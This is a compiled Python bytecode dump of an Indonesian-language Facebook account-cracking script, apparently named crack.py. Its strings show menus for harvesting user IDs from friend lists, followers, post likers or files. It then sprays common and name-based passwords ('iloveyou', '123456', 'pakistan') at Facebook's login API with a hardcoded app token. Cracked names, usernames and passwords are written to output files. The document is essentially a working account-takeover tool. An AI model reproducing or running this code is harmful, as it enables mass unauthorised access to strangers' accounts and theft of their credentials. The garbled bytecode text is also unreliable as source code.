{}s+   [1;96m%H[1;91m:[1;93m%M[1;91m:[1;92m%SRj   s   https://graph.facebook.com/s   /?access_token=t   iloveyous�   https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=s   &locale=en_US&password=sH   &sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6Rm   s*   
[1;97m{[1;92m×[1;97m} [1;92mBERHASILs4   [1;97m{[1;92m×[1;97m} Nama  [1;91m    > [1;92mRS   s4   [1;97m{[1;92m×[1;97m} User  [1;91m    > [1;92ms4   [1;97m{[1;92m×[1;97m} Password  [1;91m> [1;92ms   done/usa.txtRB   s    
{×} BERHASIL 
{×} Nama     > s   
{×} User     > s   
{×} Password > s   
s   www.facebook.comRn   s*   
[1;97m{[1;95m×[1;97m} [1;95mCEKPOINTs4   [1;97m{[1;95m×[1;97m} Nama  [1;91m    > [1;95ms4   [1;97m{[1;95m×[1;97m} User  [1;91m    > [1;95ms4   [1;97m{[1;95m×[1;97m} Password  [1;91m> [1;95ms    
{×} CEKPOINT 
{×} Nama     > t   123456Rk   Rl   Ro   Rp   (   R   R   R   Rv   R   Rw   Rx   R   R   Ry   Rz   R7   R8   R@   R9   R:   R;   R|   R}   R~   R<   R=   R   R�   R�   (
   R�   R�   R�   R   R�   Ri   R�   R�   R�   R�   R�   R�   R�   (    (    s   /sdcard/crack.pyR�   �  s�    ( 


		)

		)

		)

		)

		)

		)

		)

		)

		)

		)
i   s�   
[1;94m──────────────────────────────────────────────────s-   [1;97m{[1;95m●[1;97m} [1;95mSelesai ...sS   [1;97m{[1;95m●[1;97m} [1;95mTotal [1;92mOK[1;97m/[1;95mCP [1;97m: [1;92ms   [1;97m/[1;95msh   [1;97m{[1;95m●[1;97m} [1;92mOK[1;97m/[1;95mCP [1;95mfile tersimpan [1;91m: [1;92mdone/usa.txts    [1;97m{<[1;95mKembali[1;97m>}("   R1   R�   R   R#   R$   R7   R8   R@   R9   R:   R;   RT   R�   R?   Re   RU   R   R
   R<   R�   R�   RJ   RL   R   R   R   R   R   R   R   R    R�   R   R�   (   R�   RD   R    R�   R�   t   jokt   opR   R�   R�   R�   R�   R�   R�   (    (    s   /sdcard/crack.pyR�   �  s�    

		
		



		





 
 	�)	
c           C   s�   t  j d � y t d d � j �  a Wn7 t k
 r_ d GHt  j d � t j d � t �  n Xt  j d � t	 GHd d GHd	 GHd
 GHd GHd GHd d GHt
 �  d  S(
   NR   s	   login.txtRD   s   [1;96m[!] [1;91mToken invalids   rm -rf login.txti   i2   s
   [1;94m─s1   [1;97m{[1;91m01[1;97m} Crack Dari Daftar Temans1   [1;97m{[1;91m02[1;97m} Crack Dari Publik/Temans)   [1;97m{[1;91m03[1;97m} Crack Dari Files!   [1;97m{[1;91m00[1;97m} Kembali(   R   R#   R<   RI   R@   RJ   R   R   R
   R$   t   pilih_pakis(    (    (    s   /sdcard/crack.pyRf   Q  s"    




		c          C   s�  t  d � }  |  d k r' d GHt �  n�|  d k s? |  d k r� t j d � t GHd d GHd	 GHd d GHt j d
 t � } t j	 | j
 � } xQ| d D] } t j | d � q� Wn+|  d
 k s� |  d k r�t j d � t GHd d GHd	 GHd d GHt  d � } y> t j d | d t � } t j	 | j
 � } d | d GHWnI t
 k
 rjd GHt  d � t �  n# t j j k
 r�d GHt �  n Xt j d | d t � } t j	 | j
 � } x$| d D] } t j | d � q�Wn� |  d k s�|  d k r�t j d � t GHyZ d d GHd	 GHd d GHt  d � } x0 t | d � j �  D] }	 t j |	 j �  � qIWWq�t
 k
 r�d GHt  d � q�t k
 r�d GHt  d � t �  q�Xn. |  d k s�|  d  k r�t �  n d! GHt �  d" t t t � � GHd# GHd$ d% d& g }
 x0 |
 D]( } d' | Gt j j �  t j d( � qWd) GHd* GHd+ �  } t d, � }
 |
 j | t � d- GHd. GHd/ t t t  � � d0 t t t! � � GHd1 GHd d GHt  d2 � t �  d  S(3   Ns%   [1;91m︻デ═一▸ [91m:[1;92m R   s5   [1;97m{[1;91m![1;97m}[1;97m Isi Yg Benar Sayang !R'   R(   R   i2   s
   [1;94m─sD                [1;91m●●● [1;97mCRACK PAKISTAN [1;91m●●●s3   https://graph.facebook.com/me/friends?access_token=Ri   RT   R)   R*   sB   [1;97m{[1;91m●[1;97m} [1;91mID Publik/Teman [1;91m:[1;92m s   https://graph.facebook.com/s   ?access_token=s7   [1;97m{[1;91m●[1;97m} [1;91mNama [1;91m:[1;92m RS   s4   [1;97m{[1;91m![1;97m} ID publik/teman tidak ada !s!   
[1;91m[[1;97m<Kembali>[1;91m]s,   [1;97m{[1;91m![1;97m} Tidak ada koneksi !s   /friends?access_token=R+   R,   s<   [1;97m{[1;91m●[1;97m} [1;91mNama File[1;91m :[1;92m RD   s*   [1;97m{[1;91m![1;97m} File tidak ada ! s!   
[1;92m[ [1;97mKembali [1;92m]s)   [1;97m{[1;91m![1;97m} File tidak ada !R/   R0   s2   [1;97m{[1;91m![1;97m}[1;97m Isi Dengan Benar !s;   [1;97m{[1;91m●[1;97m} [1;91mTotal ID [1;91m:[1;92m s3   [1;97m{[1;91m●[1;97m} [1;91mStop Tekan CTRL+Zs   .   s   ..  s   ... s2   
[1;97m{[1;91m●[1;97m} [1;91mCrack Berjalan i   sB   
[1;97m{[1;93m●[1;97m} [1;93mSedang Mengambil Akun Tunggu...s�   [1;94m──────────────────────────────────────────────────c         S   s�
  t  j j d j t j �  j d � � � t  j j �  |  } y t j	 d � Wn t
 k
 r_ n Xye
t j d | d t
 � } t j | j � } | d j �  d } t j d | d	 | d
 � } t j | � } d | k rTd GHd
 | d GHd | GHd | GHt d d � } | j d | d d | d | d � | j �  t j | � np	d | d k r�d GHd | d GHd | GHd | GHt d d � } | j d | d d | d | d � | j �  t j | � n�| d j �  d }	 t j d | d	 |	 d
 � } t j | � } d | k r�d GHd
 | d GHd | GHd |	 GHt d d � } | j d | d d | d |	 d � | j �  t j | � n&d | d k r$d GHd | d GHd | GHd |	 GHt d d � } | j d | d d | d |	 d � | j �  t j | � n�| d j �  d }
 t j d | d	 |
 d
 � } t j | � } d | k r�d GHd
 | d GHd | GHd |
 GHt d d � } | j d | d d | d |
 d � | j �  t j | � n�d | d k rnd GHd | d GHd | GHd |
 GHt d d � } | j d | d d | d |
 d � | j �  t j | � nVd  } t j d | d	 | d
 � } t j | � } d | k r$d GHd
 | d GHd | GHd | GHt d d � } | j d | d d | d | d � | j �  t j | � n�d | d k r�d! GHd | d GHd | GHd | GHt d d � } | j d | d d | d | d � | j �  t j | � nd" } t j d | d	 | d
 � } t j | � } d | k r`d GHd
 | d GHd | GHd | GHt d d � } | j d | d d | d | d � | j �  t j | � ndd | d k r�d GHd | d GHd | GHd | GHt d d � } | j d | d d | d | d � | j �  t j | � n�| d# j �  d$ }
 t j d | d	 |
 d
 � } t j | � } d | k r�d GHd
 | d GHd | GHd |
 GHt d d � } | j d | d d | d |
 d � | j �  t j | � nd | d k r0d GHd | d GHd | GHd |
 GHt d d � } | j d | d d | d |
 d � | j �  t j | � n�| d# j �  d } t j d | d	 | d
 � } t j | � } d | k r�d GHd
 | d GHd | GHd | GHt d d � } | j d | d d | d | d � | j �  t j | � n�d | d k rz	d GHd | d GHd | GHd | GHt d d � } | j d | d d | d | d � | j �  t j | � nJ| d# j �  d } t j d | d	 | d
 � } t j | � } d | k r>
d GHd
 | d GHd | GHd | GHt d d � } | j d | d d | d | d � | j �  t j | � n� d | d k r�
d% GHd | d GHd | GHd | GHt d d � } | j d | d d | d | d � | j �  t j | � n  Wn n Xd  S(&   Ns   
{}s+   [1;96m%H[1;91m:[1;93m%M[1;91m:[1;92m%SRj   s   https://graph.facebook.com/s   /?access_token=Rk   Rl   s�   https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=s   &locale=en_US&password=sH   &sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6Rm   s*   
[1;97m{[1;92m×[1;97m} [1;92mBERHASILs4   [1;97m{[1;92m×[1;97m} Nama  [1;91m    > [1;92mRS   s4   [1;97m{[1;92m×[1;97m} User  [1;91m    > [1;92ms4   [1;97m{[1;92m×[1;97m} Password  [1;91m> [1;92ms   done/pakis.txtRB   s    
{×} BERHASIL 
{×} Nama     > s   
{×} User     > s   
{×} Password > s   
s   www.facebook.comRn   s*   
[1;97m{[1;91m×[1;97m} [1;91mCEKPOINTs4   [1;97m{[1;91m×[1;97m} Nama  [1;91m    > [1;91ms4   [1;97m{[1;91m×[1;97m} User  [1;91m    > [1;91ms4   [1;97m{[1;91m×[1;97m} Password  [1;91m> [1;91ms    
{×} CEKPOINT 
{×} Nama     > Ro   Rp   t   pakistans*   
[1;97m{[1;93m×[1;97m} [1;91mCEKPOINTR�   R�   R�   s*   
[1;97m{[1;91m×[1;97m} [1;93mCEKPOINT(   R   R   R   Rv   R   Rw   Rx   R   R   Ry   Rz   R7   R8   R@   R9   R:   R;   R{   R|   R}   R~   R<   R=   R   R�   R�   (   R�   R�   R�   R   R�   Ri   R�   R�   R�   R�   R�   R�   R�   R�   R�   R�   (    (    s   /sdcard/crack.pyR�   �  sh   ( 


		)

		)

		)

		)

		)

		)

		)

		)

		)

		)

		)

		)

		)

		)

		)

		)
i   s�   
[1;94m──────────────────────────────────────────────────s-   [1;97m{[1;91m●[1;97m} [1;91mSelesai ...sS   [1;97m{[1;91m●[1;97m} [1;91mTotal [1;92mOK[1;97m/[1;91mCP [1;97m: [1;92ms   [1;97m/[1;91msj   [1;97m{[1;91m●[1;97m} [1;92mOK[1;97m/[1;91mCP [1;91mfile tersimpan [1;91m: [1;92mdone/pakis.txts    [1;97m{<[1;91mKembali[1;97m>}("   R1   R�   R   R#   R$   R7   R8   R@   R9   R:   R;   RT   R�   R?   Rf   RU   R   R
   R<   R�   R�   RJ   RL   R   R   R   R   R   R   R   R    R�   R   R�   (   R�   RD   R    R�   R�   R�   R�   R   R�   R�   R�   R�   R�   R�   (    (    s   /sdcard/crack.pyR�   f  s�    

		
		



		





 
 	�)	
c             s  t  j d � y t d d � j �  �  Wn7 t k
 r_ d GHt  j d � t j d � t �  n Xy� t  j d � t GHd d GHd	 GHd d GHt	 d
 � }  t
 j d |  d �  � } t j
 | j � } x# | d
 D] } t j | d � q� Wt d � Wn' t k
 rd GHt	 d � t �  n Xd t t t � � GHd GHd d d g } x0 | D]( } d | Gt j j �  t j d � qPWd GHd GH�  f d �  } t d � } | j | t � d GHd GHd t t t � � d  t t t � � GHd! GHd d GHt	 d" � t �  d  S(#   NR   s	   login.txtRD   s   [1;97m[!] Token invalids   rm -rf login.txtg{�G�z�?i2   s
   [1;94m─sK           [1;96m●●● [1;97mCRACK POSTINGAN GRUP/TEMAN[1;96m ●●●sL   [1;97m{[1;96m●[1;97m}[1;96m ID Postingan Group/Teman [1;91m :[1;92m s   https://graph.facebook.com/s"   /likes?limit=9999999&access_token=Ri   RT   s:   
[1;97m{[1;96m●[1;97m} [1;96mMengambil ID [1;97m...s-   [1;97m{[1;91m![1;97m} ID Postingan Salah !s!   
[1;96m[<[1;97mKembali>[1;96m]s;   [1;97m{[1;96m●[1;97m} [1;96mTotal ID [1;91m:[1;92m s3   [1;97m{[1;96m●[1;97m} [1;96mStop Tekan CTRL+Zs   .   s   ..  s   ... s2   
[1;97m{[1;96m●[1;97m} [1;96mCrack Berjalan i   sB   
[1;97m{[1;93m●[1;97m} [1;93mSedang Mengambil Akun Tunggu...s�   [1;94m──────────────────────────────────────────────────c            s[  t  j j d j t j �  j d � � � t  j j �  |  } y t j	 d � Wn t
 k
 r_ n Xy�t j d | d �  � } t
 j | j � } | d j �  d } t j d | d	 | d
 � } t
 j | � } d | k rTd GHd
 | d GHd | GHd | GHt d d � } | j d | d d | d | d � | j �  t j | � n�d | d k r�d GHd | d GHd | GHd | GHt d d � } | j d | d d | d | d � | j �  t j | � nr| d j �  d }	 t j d | d	 |	 d
 � } t
 j | � } d | k r�d GHd
 | d GHd | GHd |	 GHt d d � } | j d | d d | d |	 d � | j �  t j | � n�d | d k r$d GHd | d GHd | GHd |	 GHt d d � } | j d | d d | d |	 d � | j �  t j | � n(| d j �  d }
 t j d | d	 |
 d
 � } t
 j | � } d | k r�d GHd
 | d GHd | GHd |
 GHt d d � } | j d | d d | d |
 d � | j �  t j | � ndd | d k rnd GHd | d GHd | GHd |
 GHt d d � } | j d | d d | d |
 d � | j �  t j | � n�| d  j �  d } t j d | d	 | d
 � } t
 j | � } d | k r2d GHd
 | d GHd | GHd | GHt d d � } | j d | d d | d | d � | j �  t j | � nd | d k r�d GHd | d GHd | GHd | GHt d d � } | j d | d d | d | d � | j �  t j | � n�| d  j �  d } t j d | d	 | d
 � } t
 j | � } d | k r|d GHd
 | d GHd | GHd | GHt d d � } | j d | d d | d | d � | j �  t j | � n�d | d k rd GHd | d GHd | GHd | GHt d d � } | j d | d d | d | d � | j �  t j | � nJ| d  j �  d }
 t j d | d	 |
 d
 � } t
 j | � } d | k r�d GHd
 | d GHd | GHd |
 GHt d d � } | j d | d d | d |
 d � | j �  t j | � n� d | d k rLd GHd | d GHd | GHd |
 GHt d d � } | j d | d d | d |
 d � | j �  t j | � n  Wn n Xd  S(!   Ns   
{}s+   [1;96m%H[1;91m:[1;93m%M[1;91m:[1;92m%SRj   s   https://graph.facebook.com/s   /?access_token=Rk   Rl   s�   https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=s   &locale=en_US&password=sH   &sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6Rm   s*   
[1;97m{[1;92m×[1;97m} [1;92mBERHASILs4   [1;97m{[1;92m×[1;97m} Nama  [1;91m    > [1;92mRS   s4   [1;97m{[1;92m×[1;97m} User  [1;91m    > [1;92ms4   [1;97m{[1;92m×[1;97m} Password  [1;91m> [1;92ms
   done/grup.txtRB   s    
{×} BERHASIL 
{×} Nama     > s   
{×} User     > s   
{×} Password > s   
s   www.facebook.comRn   s*   
[1;97m{[1;96m×[1;97m} [1;96mCEKPOINTs4   [1;97m{[1;96m×[1;97m} Nama  [1;91m    > [1;96ms4   [1;97m{[1;96m×[1;97m} User  [1;91m    > [1;96ms4   [1;97m{[1;96m×[1;97m} Password  [1;91m> [1;96ms    
{×} CEKPOINT 
{×} Nama     > Ro   Rp   R�   (   R   R   R   Rv   R   Rw   Rx   R   R   Ry   Rz   R7   R8   R9   R:   R;   R{   R|   R}   R~   R<   R=   R   R�   R�   (   R�   R�   R�   R   R�   Ri   R�   R�   R�   R�   R�   R�   R�   R�   (   R@   (    s   /sdcard/crack.pyR�   �  s   ( 


		)

		)

		)

		)

		)

		)

		)

		)

		)

		)

		)

		)
i   s�   
[1;94m──────────────────────────────────────────────────s-   [1;97m{[1;96m●[1;97m} [1;96mSelesai ...sS   [1;97m{[1;96m●[1;97m} [1;96mTotal [1;92mOK[1;97m/[1;96mCP [1;97m: [1;92ms   [1;97m/[1;96msi   [1;97m{[1;96m●[1;97m} [1;92mOK[1;97m/[1;96mCP [1;96mfile tersimpan [1;91m: [1;92mdone/grup.txts    [1;97m{<[1;96mKembali[1;97m>}(   R   R#   R<   RI   RJ   R   R   t   loginR$   R1   R7   R8   R9   R:   R;   RT   R�   R"   R?   RL   R   R   R   R   R   R    R�   R   R�   (   t   tezRD   R    R   R�   R�   R�   R�   (    (   R@   s   /sdcard/crack.pyR]   |  sV    




		


 
 �)	
c    
         s  t  d d � j �  �  t j d � t GHd d GHd GHd d GHt d � }  y> t j d |  d	 �  � } t j	 | j
 � } d
 | d GHWnI t k
 r� d GHt d
 � t �  n# t j
 j k
 r� d GHt �  n Xt j d |  d �  � } t j	 | j
 � } x# | d D] } t j | d � qWd t t t � � GHd GHd d d g } x0 | D]( } d | Gt j j �  t j d � qWWd GHd GH�  f d �  } t d � }	 |	 j | t � d GHd GHd t t t � � d  t t t � � GHd! GHd d GHt d" � t �  d  S(#   Ns	   login.txtRD   R   i2   s
   [1;94m─sF                 [1;95m●●● [1;97mCRACK FOLLOWERS [1;95m●●●sB   [1;97m{[1;95m●[1;97m} [1;95mID Publik/Teman [1;91m:[1;92m s   https://graph.facebook.com/s   ?access_token=s7   [1;97m{[1;95m●[1;97m} [1;95mNama [1;91m:[1;92m RS   s4   [1;97m{[1;91m![1;97m} ID publik/teman tidak ada !s!   
[1;95m[[1;97m<Kembali>[1;95m]s,   [1;97m{[1;91m![1;97m} Tidak ada koneksi !s'   /subscribers?limit=999999&access_token=Ri   RT   sE   [1;97m{[1;95m●[1;97m} [1;95mTotal ID Followers [1;91m:[1;92m s3   [1;97m{[1;95m●[1;97m} [1;95mStop Tekan CTRL+Zs   .   s   ..  s   ... s2   
[1;97m{[1;95m●[1;97m} [1;95mCrack Berjalan i   sB   
[1;97m{[1;93m●[1;97m} [1;93mSedang Mengambil Akun Tunggu...s�   [1;94m──────────────────────────────────────────────────c            s[  t  j j d j t j �  j d � � � t  j j �  |  } y t j	 d � Wn t
 k
 r_ n Xy�t j d | d �  � } t
 j | j � } | d j �  d } t j d | d	 | d
 � } t
 j | � } d | k rTd GHd
 | d GHd | GHd | GHt d d � } | j d | d d | d | d � | j �  t j | � n�d | d k r�d GHd | d GHd | GHd | GHt d d � } | j d | d d | d | d � | j �  t j | � nr| d j �  d }	 t j d | d	 |	 d
 � } t
 j | � } d | k r�d GHd
 | d GHd | GHd |	 GHt d d � } | j d | d d | d |	 d � | j �  t j | � n�d | d k r$d GHd | d GHd | GHd |	 GHt d d � } | j d | d d | d |	 d � | j �  t j | � n(| d j �  d }
 t j d | d	 |
 d
 � } t
 j | � } d | k r�d GHd
 | d GHd | GHd |
 GHt d d � } | j d | d d | d |
 d � | j �  t j | � ndd | d k rnd GHd | d GHd | GHd |
 GHt d d � } | j d | d d | d |
 d � | j �  t j | � n�| d  j �  d } t j d | d	 | d
 � } t
 j | � } d | k r2d GHd
 | d GHd | GHd | GHt d d � } | j d | d d | d | d � | j �  t j | � nd | d k r�d GHd | d GHd | GHd | GHt d d � } | j d | d d | d | d � | j �  t j | � n�| d  j �  d } t j d | d	 | d
 � } t
 j | � } d | k r|d GHd
 | d GHd | GHd | GHt d d � } | j d | d d | d | d � | j �  t j | � n�d | d k rd GHd | d GHd | GHd | GHt d d � } | j d | d d | d | d � | j �  t j | � nJ| d  j �  d }
 t j d | d	 |
 d
 � } t
 j | � } d | k r�d GHd
 | d GHd | GHd |
 GHt d d � } | j d | d d | d |
 d � | j �  t j | � n� d | d k rLd GHd | d GHd | GHd |
 GHt d d � } | j d | d d | d |
 d � | j �  t j | � n  Wn n Xd  S(!   Ns   
{}s+   [1;96m%H[1;91m:[1;93m%M[1;91m:[1;92m%SRj   s   https://graph.facebook.com/s   /?access_token=Rk   Rl   s�   https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=s   &locale=en_US&password=sH   &sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6Rm   s*   
[1;97m{[1;92m×[1;97m} [1;92mBERHASILs4   [1;97m{[1;92m×[1;97m} Nama  [1;91m    > [1;92mRS   s4   [1;97m{[1;92m×[1;97m} User  [1;91m    > [1;92ms4   [1;97m{[1;92m×[1;97m} Password  [1;91m> [1;92ms   done/follow.txtRB   s    
{×} BERHASIL 
{×} Nama     > s   
{×} User     > s   
{×} Password > s   
s   www.facebook.comRn   s*   
[1;97m{[1;95m×[1;97m} [1;95mCEKPOINTs4   [1;97m{[1;95m×[1;97m} Nama  [1;91m    > [1;95ms4   [1;97m{[1;95m×[1;97m} User  [1;91m    > [1;95ms4   [1;97m{[1;95m×[1;97m} Password  [1;91m> [1;95ms    
{×} CEKPOINT 
{×} Nama     > Ro   Rp   R�   (   R   R   R   Rv   R   Rw   Rx   R   R   Ry   Rz   R7   R8   R9   R:   R;   R{   R|   R}   R~   R<   R=   R   R�   R�   (   R�   R�   R�   R   R�   Ri   R�   R�   R�   R�   R�   R�   R�   R�   (   R@   (    s   /sdcard/crack.pyR�   c  s   ( 


		)

		)

		)

		)

		)

		)

		)

		)

		)

		)

		)

		)
i   s�   
[1;94m──────────────────────────────────────────────────s-   [1;97m{[1;95m●[1;97m} [1;95mSelesai ...sS   [1;97m{[1;95m●[1;97m} [1;95mTotal [1;92mOK[1;97m/[1;95mCP [1;97m: [1;92ms   [1;97m/[1;95msk   [1;97m{[1;95m●[1;97m} [1;92mOK[1;97m/[1;95mCP [1;95mfile tersimpan [1;91m: [1;92mdone/follow.txts    [1;97m{<[1;95mKembali[1;97m>}(   R<   RI   R   R#   R$   R1   R7   R8   R9   R:   R;   R?   RL   RU   R   R
   RT   R�   R   R   R   R   R   R   R   R    R�   R   R�   (
   R�   R�   R�   RD   R    R   R�   R�   R�   R�   (    (   R@   s   /sdcard/crack.pyR^   B  sR    
		



 
 �)	
c          C   su   t  j d � t GHd d GHd }  |  t d � } t j d � } t j | � } | j | j	 � GHt d � t
 �  d  S(   NR   i2   s
   [1;94m─s   https://www.facebook.com/s%   [1;97m{[1;95m×[1;97m} Username : s   "entity_id":"([0-9]+)"s!   
[1;95m[[1;97m<Kembali>[1;95m](   R   R#   R$   R1   t   ret   compileR7   R8   t   findallt   contentRL   (   t   lingt   urlt   idret   page(    (    s   /sdcard/crack.pyR_     s    
	
c           C   sC   t  j d � t GHd GHt d � t  j d � t d � t �  d  S(   NR   s�   [1;94m──────────────────────────────────────────────────s$   [1;92mMemperbarui Script ...[1;93ms   git pull origin masters!   
[1;94m{[1;97m<Kembali>[1;94m}(   R   R#   R$   R"   R1   RL   (    (    (    s   /sdcard/crack.pyR`     s    



t   __main__(L   R   R   R   t	   mechanizet	   itertoolsR   R   t   hashlibR�   t	   threadingR9   t   getpassR|   t	   cookielibt   multiprocessing.poolR    t   Pt   Mt   Ht   Kt   Bt   Ut   Ot   my_colort   choiceRW   RV   t   ImportErrorR#   R7   t   requests.exceptionsR   R   t   reloadt   setdefaultencodingt   brt   set_handle_robotst   Falset   set_handle_refresht   _httpt   HTTPRefreshProcessort
   addheadersR
   R   R   R"   R$   t   backt   threadst   berhasilR�   R   R�   RT   R&   R%   R2   R3   R>   RL   RX   R\   Rb   Rc   Rh   Rd   R�   Re   R�   Rf   R�   R]   R^   R_   R`   t   __name__(    (    (    s   /sdcard/crack.pyt   <module>   s�   �





			
		
			
		)		
			� 		� 		�		� 	�	�	
		
